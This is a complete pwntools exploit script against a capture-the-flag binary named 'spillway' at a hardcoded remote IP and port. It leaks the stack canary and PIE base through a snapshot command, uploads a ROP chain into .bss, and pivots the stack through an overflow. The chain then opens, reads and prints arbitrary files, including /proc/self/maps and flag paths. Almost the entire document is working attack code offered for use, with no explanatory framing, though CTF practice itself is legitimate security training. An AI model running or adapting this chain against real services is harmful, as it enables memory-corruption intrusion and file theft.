#!/usr/bin/env python3
"""Spillway To Heaven: snapshot leak + emergency pivot + gated open/read/write."""

import sys
from pwn import *

context.arch = "amd64"
context.log_level = "info"

BIN = "./spillway"
HOST = "47.131.225.172"
PORT = 19306

POP_RDI = 0x134B
POP_RSI = 0x134D
POP_RDX = 0x134F
POP_RCX = 0x1351
MOV_RSI_RAX = 0x1355
LEAVE_RET = 0x1359
RET = 0x134C
WRITE_PLT = 0x1070
MEMCPY_PLT = 0x1120
SYS_GATE = 0x12E0
BSS = 0x4040
UNLOCK = 0x5050
SNAP_RET = 0x1C8C

SYS_READ = 0
SYS_OPEN = 2
SYS_EXIT = 60


class Chain:
    def __init__(self, ret):
        self.ws = [0]  # dummy rbp consumed by leave
        self.ret = ret

    def g(self, x):
        self.ws.append(x)

    def pop(self, gadget, val):
        self.ws.append(gadget)
        self.ws.append(val)

    def call(self, func):
        # function address must sit at an even index so entry rsp is 8 mod 16
        if len(self.ws) % 2 == 1:
            self.ws.append(self.ret)
        self.ws.append(func)

    def bytes(self):
        return b"".join(p64(w) for w in self.ws)


def make_chain(base, files, sbase, slots):
    def S(key):
        return sbase + rel[key]

    c = Chain(base + RET)
    c.pop(base + POP_RDI, base + UNLOCK)
    c.pop(base + POP_RSI, S("one"))
    c.pop(base + POP_RDX, 4)
    c.call(base + MEMCPY_PLT)

    for i, (mark, path, n) in enumerate(files):
        m = mark if isinstance(mark, bytes) else mark.encode()
        dest = base + BSS + slots[i]
        c.pop(base + POP_RDI, 1)
        c.pop(base + POP_RSI, S(f"m{i}"))
        c.pop(base + POP_RDX, len(m))
        c.call(base + WRITE_PLT)
        c.pop(base + POP_RDI, SYS_OPEN)
        c.pop(base + POP_RSI, S(f"p{i}"))
        c.pop(base + POP_RDX, 0)
        c.pop(base + POP_RCX, 0)
        c.call(base + SYS_GATE)
        c.pop(base + POP_RDI, SYS_READ)
        c.g(base + MOV_RSI_RAX)
        c.pop(base + POP_RDX, dest)
        c.pop(base + POP_RCX, n)
        c.call(base + SYS_GATE)
        c.pop(base + POP_RDI, 1)
        c.pop(base + POP_RSI, dest)
        c.pop(base + POP_RDX, n)
        c.call(base + WRITE_PLT)

    c.pop(base + POP_RDI, SYS_EXIT)
    c.pop(base + POP_RSI, 0)
    c.pop(base + POP_RDX, 0)
    c.pop(base + POP_RCX, 0)
    c.call(base + SYS_GATE)
    return c.bytes()


def build(base, files):
    global rel
    items = [("one", p32(1))]
    for i, (mark, path, n) in enumerate(files):
        items.append((f"m{i}", mark if isinstance(mark, bytes) else mark.encode()))
        items.append((f"p{i}", path if isinstance(path, bytes) else path.encode()))

    rel = {}
    blob = b""
    for key, data in items:
        rel[key] = len(blob)
        blob += data if data.endswith(b"\x00") else data + b"\x00"

    # length is independent of the absolute addresses we embed
    chain_len = len(make_chain(base, files, 0, [0] * len(files)))
    str_at = (chain_len + 0xF) & ~0xF
    buf = (str_at + len(blob) + 0xF) & ~0xF
    slots = []
    for _, _, n in files:
        slots.append(buf)
        buf += (n + 0xF) & ~0xF
    if buf >= 0x3100:
        raise SystemExit(f"reads run off bss ({buf:#x})")
    if str_at < chain_len:
        raise SystemExit("strings overlap chain")

    chain = make_chain(base, files, base + BSS + str_at, slots)
    if len(chain) != chain_len:
        raise SystemExit(f"chain size changed {chain_len} -> {len(chain)}")
    payload = chain.ljust(str_at, b"\x00") + blob
    log.info("chain %d strings@%#x payload %d read_end %#x", len(chain), str_at, len(payload), buf)
    if len(payload) > 0x1000:
        raise SystemExit("payload does not fit")
    return payload


def exploit(io, files):
    io.recvuntil(b"spillway> ")
    io.sendline(b"SNAPSHOT 64")
    line = io.recvline().strip()
    blob = bytes.fromhex(line.decode())
    if len(blob) != 64 or blob[:32] != b"S" * 32:
        log.failure("unexpected snapshot: %r", line)
        return b""
    canary = blob[0x28:0x30]
    ret = u64(blob[0x38:0x40])
    base = ret - SNAP_RET
    log.success("canary %#x pie %#x", u64(canary), base)
    if base & 0xFFF:
        log.failure("pie base not page aligned")
        return b""

    payload = build(base, files)
    io.recvuntil(b"spillway> ")
    io.sendline(b"UPLOAD 0 " + payload.hex().encode())
    up = io.recvuntil(b"spillway> ")
    if b"uploaded" not in up:
        log.failure("upload rejected: %r", up)
        return up

    overflow = b"A" * 24 + canary + p64(base + BSS) + p64(base + LEAVE_RET)
    assert len(overflow) == 48
    io.sendline(b"EMERGENCY " + overflow.hex().encode())
    return io.recvrepeat(3)


def main():
    remote_mode = len(sys.argv) > 1 and sys.argv[1] == "remote"
    if remote_mode:
        names = [
            "/flag", "/flag.txt", "flag", "flag.txt", "./flag",
            "archive", "incident", "incident_archive",
            "/home/ctf/flag", "/home/ctf/flag.txt", "/app/flag",
        ]
        files = [
            (b"\n== CMDLINE ==\n", b"/proc/self/cmdline", 0x80),
            (b"\n== MAPS ==\n", b"/proc/self/maps", 0x400),
        ]
        for n in names:
            files.append((f"\n== {n} ==\n".encode(), n.encode(), 0x100))
    else:
        files = [
            (b"\n== HOST ==\n", b"/etc/hostname", 0x40),
            (b"\n== ARCHIVE ==\n", b"archive", 0x80),
            (b"\n== DOTFLAG ==\n", b"flag", 0x80),
        ]
    build(0x555555554000, files)  # fail early if the chain does not fit
    if remote_mode:
        io = remote(HOST, PORT)
    else:
        io = process(BIN)
    data = exploit(io, files)
    sys.stdout.buffer.write(data or b"")
    sys.stdout.buffer.write(b"\n")


if __name__ == "__main__":
    main()
